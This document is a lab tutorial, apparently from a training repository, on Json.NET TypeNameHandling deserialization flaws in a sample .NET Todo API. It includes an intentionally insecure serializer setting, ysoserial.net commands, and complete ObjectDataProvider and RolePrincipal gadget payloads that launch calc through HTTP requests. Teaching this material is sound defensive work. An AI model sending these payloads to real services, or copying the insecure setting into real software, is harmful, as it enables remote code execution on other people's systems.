# JSON Serialization Vulnerability

The [Friday the 13th](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf) exploit uses the `TypeNameHandling` property to manipulate native .NET Framework class to launch a malicious process on the host environment.

The exercises in this section use the [src\02-Framework-JsonVulnerabilties\02-Framework-JsonVulnerabilties.sln](https://github.com/johniwasz/rce-serialization-dotnet/tree/main/src/02-Framework-JsonVulnerabilties). Please load the solution file in Visual Studio.

The `Register` method in [WebConfig.cs](https://github.com/johniwasz/rce-serialization-dotnet/blob/main/src/02-Framework-JsonVulnerabilties/TodoApi/App_Start/WebApiConfig.cs) in 02-Framework-JsonVulnerabilities/Todo/App_Start sets global serialization options.

``` csharp
public static void Register(HttpConfiguration config)
{
    // This introduces a security risk.
    config.Formatters.JsonFormatter.SerializerSettings.TypeNameHandling =
            Newtonsoft.Json.TypeNameHandling.All;

    config.Formatters.JsonFormatter.SerializerSettings.ContractResolver =
        new Newtonsoft.Json.Serialization.CamelCasePropertyNamesContractResolver();
```

Setting `TypeNameHandling` to anything other than `TypeNameHandling.None` exposes the vulnerability through at $type property that defines the type to deserialize. Running the `SerializeFido` test in the JsonVulnerabilities.Test project demonstrates this by serializing:

``` csharp
Dog fido = new Dog
{
    Name = "Fido",
    Breed = "Golden Retriever",
    Owner = "John Doe"
};
```

Which produces:

``` json
{
  "$type": "Todo.Models.Dog, Todo.Models",
  "name": "Fido",
  "breed": "Golden Retriever",
  "owner": "John Doe"
}
```

The `Todo.Models.Dog` class only recognizes string values and cannot be exploited; however, other .NET Framework classes like [`System.Windows.Data.ObjectDataProvider`](https://learn.microsoft.com/en-us/dotnet/api/system.windows.data.objectdataprovider?view=netframework-4.8.1&WT.mc_id=MVP_337682) and [`System.Web.Security.RolePrincipal`](https://learn.microsoft.com/en-us/dotnet/api/system.web.security.roleprincipal?view=netf&WT.mc_id=MVP_337682ramework-4.8.1) expose a remote code execution vulnerability.

Ysoserial.net includes c

Use ysoserial.exe to create a vulnerable payload using:

``` powershell
ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc"
```

| Parameter | Description |
| --- | --- |
| -f Json.Net | The serializer and format |
| -g ObjectDataProvider | The gadget chain (exploitable class) |
| -o raw |  The output format (raw\|base64\|raw-urlencode\|base64-urlencode\|hex). Default: raw |
| -c "calc" | The command to be executed |

This produces:

``` json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "$values": [ "cmd", "/ccalc" ]
  },
  "ObjectInstance": { "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" }
}
```

The `ObjectDataProvider` uses `System.Diagnostics.Process` to pass the command to the `Start` method.

Use the JsonVulnerabilities.Test project `LaunchObjectDataProviderExploit` test case to observe the exploit in isolation. Note that this does not raise an exception and that calc.exe runs.

Alternatively, generate a message to run calc.exe using the `RolePrincipal` with:

``` powershell
ysoserial.exe -f Json.Net -g RolePrincipal -o raw -c "calc"
```

This generates:

``` json
{
  "$type": "System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a",
  "System.Security.ClaimsPrincipal.Identities": "AAEAAAD////...lkZXI+Cw=="
}
```

The message is serialization serialized to JSON and value of `System.Security.ClaimsPrincipal.Identities` is base64 encoded. The `RolePrincipal` uses the `BinaryFormatter` to deserialize after the JSON message is deserialized. Running the `LaunchRolePrincipalExploit` test case runs this exploit in isolation. Note that an exception is generated but calc.exe is still launched.

## Reproducing the Exploit : Launch Calc

1. Run the solution in Debug mode.

1. Open the requests.http file in the Solution Items directory.

1. Send the requests in order with the following labels:

    | Label | Result |
    | --- | --- |
    | list all items | Returns an empty array. |
    | create a new task | _walk dog_ task is added. Observe `isComplete` is `false` |
    | update an existing task | sets `isComplete` property on _walk dog_ task to `true` |
    | send benign binary data | creates a take named _walk fido_ and metadata that includes details about Fido |
    | list all items | Returns _walk dog_ and _walk fido_ tasks |

    These requests do not result in any errors or exploits. The last request returns:

    ``` json
    {
    "$type": "System.Collections.Generic.SynchronizedCollection`1[[Todo.Models.TodoItem, Todo.Models]], System.ServiceModel",
    "$values": 
        [
            {
                "$type": "Todo.Models.TodoItem, Todo.Models",
                "id": 0,
                "name": "walk dog",
                "isComplete": true,
                "metadata": null
            },
            {
                "$type": "Todo.Models.TodoItem, Todo.Models",
                "id": 1,
                "name": "walk fido",
                "isComplete": false,
                "metadata": 
                {
                    "$type": "System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[System.Object, mscorlib]], mscorlib",
                    "fido": 
                    {
                        "$type": "Todo.Models.Dog, Todo.Models",
                        "name": "Fido",
                        "breed": "Golden Retriever",
                        "owner": "John Doe"
                    }
                }
            }
        ]
    }
    ```

1. Send the request labeled `send malicious ObjectDataProvider gadget`. Observe that this launches the Calculator app on Windows.

    ``` json
    {
    "name": "pwn with ObjectDataProvider",
    "metadata" : 
        {
            "fido": 
            {
                "$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
                "MethodName":"Start",
                "MethodParameters":{
                    "$type":"System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
                    "$values":["cmd","/ccalc"]
                },
                "ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}
            }
        }
    }
    ```

1. Send the request labeled `send malicious RolePrincipal gadget`. Observe that this launches the Calculator app on Windows.

    ``` json
    {
    "name": "pwn with RolePrincipal",
    "metadata" : 
    {
        "fido": 
        {
        "$type": "System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a",
        "System.Security.ClaimsPrincipal.Identities": "AAEAAAD...lkZXI+Cw=="
        }
    }
    }
    ```
